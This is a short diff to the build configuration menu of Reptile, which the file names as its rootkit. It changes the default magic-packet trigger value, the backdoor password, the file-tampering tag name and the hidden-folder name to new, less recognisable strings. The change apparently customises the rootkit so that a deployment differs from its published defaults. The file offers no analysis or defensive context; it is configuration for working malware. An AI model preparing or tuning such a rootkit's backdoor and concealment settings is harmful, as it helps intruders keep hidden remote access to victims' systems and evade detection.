@@ -11,11 +11,11 @@ menu "Backdoor configuration"
         
     config MAGIC_VALUE
         string "Magic value to magic packets"
-        default "hax0r"
+        default "m3at"
 
     config PASSWORD
         string "Backdoor password"
-        default "s3cr3t"
+        default "p0tato5"
 
     config SRCPORT
         int "Source port of magic packets"
@@ -34,7 +34,7 @@ menu "Name used in file tampering tags"
     
     config TAG_NAME
         string "Tag name that hide file contents"
-        default "reptile"
+        default "r3ptile"
                 
     comment "END"
 endmenu
@@ -50,7 +50,7 @@ config CONFIG_HIDE_DIR
 menu "Hide name (needed to create Reptile's folder)"
     config HIDE
         string "Hide name"
-        default "reptile"
+        default "turkey"
             
     comment "END"
 endmenu
